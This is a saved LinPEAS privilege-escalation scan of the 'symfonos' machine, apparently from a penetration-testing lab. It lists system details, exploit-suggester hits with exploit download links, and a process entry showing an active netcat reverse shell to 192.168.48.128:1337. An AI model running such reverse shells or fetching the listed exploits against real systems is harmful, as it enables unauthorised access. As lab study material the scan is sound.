---
title: "symfonosLinpeasOutput"
tags:
  - fetus
---
```sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                   
    |---------------------------------------------------------------------------------|                                                   
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                   
    |         Follow on Twitter         :     @hacktricks_live                        |                                                   
    |         Respect on HTB            :     SirBroccoli                             |                                                   
    |---------------------------------------------------------------------------------|                                                   
    |                                 Thank you!                                      |                                                   
    \---------------------------------------------------------------------------------/                                                   
          LinPEAS-ng by carlospolop                                                                                                       
                                                                                                                                          
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                    
                                                                                                                                          
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                  
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                       
                               ╚═══════════════════╝                                                                                      
OS: Linux version 4.9.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16)
User & Groups: uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
Hostname: symfonos

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                 
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)            
                                                                                                                                          

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                          
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                        
                              ╚════════════════════╝                                                                                      
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                         
Linux version 4.9.0-9-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16)
Distributor ID: Debian
Description:    Debian GNU/Linux 9.9 (stretch)
Release:        9.9
Codename:       stretch

╔══════════╣ Sudo version
sudo Not Found                                                                                                                            
                                                                                                                                          

╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                    
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                              

╔══════════╣ Date & uptime
Wed May 28 16:07:01 CDT 2025                                                                                                              
 16:07:01 up  1:38,  0 users,  load average: 0.01, 0.01, 0.00

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                 
UUID=eb30c486-0c1e-420b-8b3a-ff48ca7a57b4 /               ext4    errors=remount-ro 0       1                                             
UUID=434158cb-a5e9-450c-99b8-796b15e9b3bb none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                      
sda
sda1
sda2
sda5

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                   
SHLVL=3                                                                                                                                   
OLDPWD=/home/helios/share
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=8:13588
_=./linpeas.sh
TERM=xterm-256color
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=96b0b1b30a3349a98f3eb573e35db6f4
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
LS_COLORS=
APACHE_RUN_GROUP=helios
APACHE_RUN_USER=helios
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                     
dmesg Not Found                                                                                                                           
                                                                                                                                          
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                        
cat: write error: Broken pipe                                                                                                             
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},[ debian=9{kernel:4.9.0-*} ],debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-10149] raptor_exim_wiz

   Details: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/46996

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c


╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor.d                                                                                       
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                  
═╣ PaX bins present? .............. PaX Not Found                                                                                         
═╣ Execshield enabled? ............ Execshield Not Found                                                                                  
═╣ SELinux enabled? ............... sestatus Not Found                                                                                    
═╣ Seccomp enabled? ............... disabled                                                                                              
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                          

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                       
                                   ╚═══════════╝                                                                                          
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details                                                                                                            
═╣ Is this a container? ........... No                                                                                                    
═╣ Any running containers? ........ No                                                                                                    
                                                                                                                                          

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                       
                                     ╚═══════╝                                                                                            
/usr/bin/curl
Learn and practice cloud hacking techniques in training.hacktricks.xyz
                                                                                                                                          
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                        
                ╚════════════════════════════════════════════════╝                                                                        
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root          1  0.0  1.3 138844  6668 ?        Ss   14:28   0:01 /sbin/init                                                              
root        213  0.0  1.0  55512  4884 ?        Ss   14:28   0:00 /lib/systemd/systemd-journald
root        241  0.0  0.9  46448  4484 ?        Ss   14:28   0:00 /lib/systemd/systemd-udevd
systemd+    299  0.0  0.8 127284  4160 ?        Ssl  14:28   0:02 /lib/systemd/systemd-timesyncd
root        353  0.0  0.6 250112  3172 ?        Ssl  14:28   0:00 /usr/sbin/rsyslogd -n
message+    356  0.0  0.7  45128  3696 ?        Ss   14:28   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        370  0.0  0.8  37980  4284 ?        Ss   14:28   0:00 /lib/systemd/systemd-logind
root        372  0.0  0.5  29664  2864 ?        Ss   14:28   0:00 /usr/sbin/cron -f
root        385  0.0  0.3  14524  1792 tty1     Ss+  14:28   0:00 /sbin/agetty --noclear tty1 linux
root        391  0.0  1.1  69952  5628 ?        Ss   14:28   0:00 /usr/sbin/sshd -D
root        502  0.0  0.5  20476  2848 ?        Ss   14:28   0:00 /sbin/dhclient -nw
root        517  0.0  4.8 271460 23692 ?        Ss   14:28   0:00 /usr/sbin/apache2 -k start
helios      621  0.0  2.1 271768 10344 ?        S    14:28   0:00  _ /usr/sbin/apache2 -k start
helios      622  0.0  2.1 271768 10344 ?        S    14:28   0:00  _ /usr/sbin/apache2 -k start
helios      623  0.0  2.2 271768 10816 ?        S    14:28   0:00  _ /usr/sbin/apache2 -k start
helios      624  0.0  2.2 271768 11084 ?        S    14:28   0:00  _ /usr/sbin/apache2 -k start
helios      625  0.0  2.1 271768 10348 ?        S    14:28   0:00  _ /usr/sbin/apache2 -k start
helios     1007  0.0  2.1 271768 10320 ?        S    15:06   0:00  _ /usr/sbin/apache2 -k start
helios     1225  0.0  0.1   4276   752 ?        S    16:00   0:00      _ sh -c nc -e /bin/bash 192.168.48.128 1337
helios     1226  0.0  0.5  17940  2900 ?        S    16:00   0:00          _ bash
helios     1229  0.0  0.6  17956  2996 ?        S    16:03   0:00              _ bash
helios     1250  0.0  0.3  18928  1900 ?        S    16:03   0:00                  _ /usr/bin/script -qc /bin/bash /dev/null
helios     1251  0.0  0.1   4276   788 pts/0    Ss   16:03   0:00                      _ sh -c /bin/bash
helios     1252  0.0  0.9  19248  4528 pts/0    S    16:03   0:00                          _ /bin/bash
helios     1506  0.0  0.4   5088  2408 pts/0    S+   16:06   0:00                              _ /bin/sh ./linpeas.sh
helios     4660  0.0  0.1   5088   904 pts/0    S+   16:07   0:00                                  _ /bin/sh ./linpeas.sh
helios     4664  0.0  0.6  36772  2936 pts/0    R+   16:07   0:00                                  |   _ ps fauxwww
helios     4663  0.0  0.1   5088   904 pts/0    S+   16:07   0:00                                  _ /bin/sh ./linpeas.sh
root        554  0.0  1.2 226256  6048 ?        Ss   14:28   0:00 /usr/sbin/nmbd
mysql       603  0.0 15.9 653832 77588 ?        Ssl  14:28   0:02 /usr/sbin/mysqld
root        663  0.0  0.5  20476  2876 ?        Ss   14:28   0:00 /sbin/dhclient -4 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root        824  0.0  0.9  81180  4428 ?        Ss   14:28   0:00 /usr/lib/postfix/sbin/master -w
postfix     826  0.0  1.3  83248  6596 ?        S    14:28   0:00  _ pickup -l -t unix -u -c
postfix     827  0.0  1.3  83296  6720 ?        S    14:28   0:00  _ qmgr -l -t unix -u
root        900  0.0  3.1 318176 15300 ?        Ss   14:28   0:00 /usr/sbin/smbd
root        901  0.0  1.2 310072  6000 ?        S    14:28   0:00  _ /usr/sbin/smbd
root        902  0.0  0.9 310064  4500 ?        S    14:28   0:00  _ /usr/sbin/smbd
root        905  0.0  1.3 318176  6660 ?        S    14:28   0:00  _ /usr/sbin/smbd


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                         
gdm-password Not Found                                                                                                                    
gnome-keyring-daemon Not Found                                                                                                            
lightdm Not Found                                                                                                                         
vsftpd Not Found                                                                                                                          
apache2 process found (dump creds from memory as root)                                                                                    
sshd Not Found
                                                                                                                                          
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                 
                                                                                                                                          
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                        
COMMAND    PID TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                            

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                           
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                         

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                      
/usr/bin/crontab                                                                                                                          
incrontab Not Found
-rw-r--r-- 1 root root     722 Oct  7  2017 /etc/crontab                                                                                  

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
-rw-r--r--  1 root root  712 Jan  1  2017 php

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
-rwxr-xr-x  1 root root  539 Nov  3  2018 apache2
-rwxr-xr-x  1 root root 1474 Jan 18  2019 apt-compat
-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 Jun 25  2018 dpkg
-rwxr-xr-x  1 root root 4125 May 28  2019 exim4-base
-rwxr-xr-x  1 root root   89 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
-rwxr-xr-x  1 root root  249 May 17  2017 passwd
-rwxr-xr-x  1 root root  383 Mar 30  2019 samba

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 83 root root 4096 May 28 16:05 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
-rwxr-xr-x  1 root root  723 Dec 13  2016 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                  
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES               
Wed 2025-05-28 16:09:00 CDT  1min 54s left Wed 2025-05-28 15:39:13 CDT  27min ago    phpsessionclean.timer        phpsessionclean.service
Thu 2025-05-29 02:08:05 CDT  10h left      Wed 2025-05-28 14:28:52 CDT  1h 38min ago apt-daily.timer              apt-daily.service
Thu 2025-05-29 06:46:39 CDT  14h left      Wed 2025-05-28 14:28:52 CDT  1h 38min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2025-05-29 14:43:53 CDT  22h left      Wed 2025-05-28 14:43:53 CDT  1h 23min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                  
                                                                                                                                          
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                                         
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path
/etc/systemd/system/mysql.service could be executing some relative path
/etc/systemd/system/mysqld.service could be executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
/lib/systemd/system/mariadb.service could be executing some relative path
/lib/systemd/system/mariadb@.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                        
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                 
sed: -e expression #1, char 0: no previous regular expression                                                                             
/anvil
/bounce
/bsmtp
/cleanup
/defer
/discard
/error
/flush
/ifmail
/lmtp
/local
/maildrop
/mailman
/pickup
/proxymap
/proxywrite
/qmgr
/relay
/retry
/rewrite
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/samba/nmbd/unexpected
  └─(Read Write)
/run/systemd/cgroups-agent
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/scache
/scalemail-backend
/showq
/smtp
/tlsmgr
/trace
/uucp
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/samba/nmbd/unexpected
  └─(Read Write)
/var/spool/postfix/dev/log
  └─(Read Write)
/verify
/virtual

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                   
NAME                             PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                               1 systemd         root             :1.0          init.scope                -          -                  
:1.1                             370 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
:1.9                            6879 busctl          helios           :1.9          apache2.service           -          -                  
org.freedesktop.DBus             356 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.hostname1          - -               -                (activatable) -                         -         
org.freedesktop.locale1            - -               -                (activatable) -                         -         
org.freedesktop.login1           370 systemd-logind  root             :1.1          systemd-logind.service    -          -                  
org.freedesktop.network1           - -               -                (activatable) -                         -         
org.freedesktop.resolve1           - -               -                (activatable) -                         -         
org.freedesktop.systemd1           1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1          - -               -                (activatable) -                         -         
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                   
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)           
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                       
                              ╚═════════════════════╝                                                                                     
╔══════════╣ Interfaces
default         0.0.0.0                                                                                                                   
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:95:12:de brd ff:ff:ff:ff:ff:ff
    inet 192.168.48.134/24 brd 192.168.48.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe95:12de/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Hostname, hosts and DNS
symfonos                                                                                                                                  
127.0.0.1       localhost
127.0.1.1       symfonos

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 192.168.48.2

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                              
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                                                                       
tcp    LISTEN     0      50        *:139                   *:*                  
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      100       *:25                    *:*                  
tcp    LISTEN     0      50        *:445                   *:*                  
tcp    LISTEN     0      50       :::139                  :::*                  
tcp    LISTEN     0      128      :::80                   :::*                  
tcp    LISTEN     0      128      :::22                   :::*                  
tcp    LISTEN     0      100      :::25                   :::*                  
tcp    LISTEN     0      50       :::445                  :::*                  

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                        
                                                                                                                                          


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                       
                               ╚═══════════════════╝                                                                                      
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                   
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)            

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                              
netpgpkeys Not Found
netpgp Not Found                                                                                                                          
                                                                                                                                          
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                           
                                                                                                                                          

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                     
ptrace protection is disabled (0), so sudo tokens could be abused                                                                         

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2               
                                                                                                                                          
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                           

╔══════════╣ Users with console
helios:x:1000:1000:,,,:/home/helios:/bin/bash                                                                                             
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                    
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(Debian-exim) gid=109(Debian-exim) groups=109(Debian-exim)
uid=106(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=107(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=108(mysql) gid=114(mysql) groups=114(mysql)
uid=109(postfix) gid=115(postfix) groups=115(postfix)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
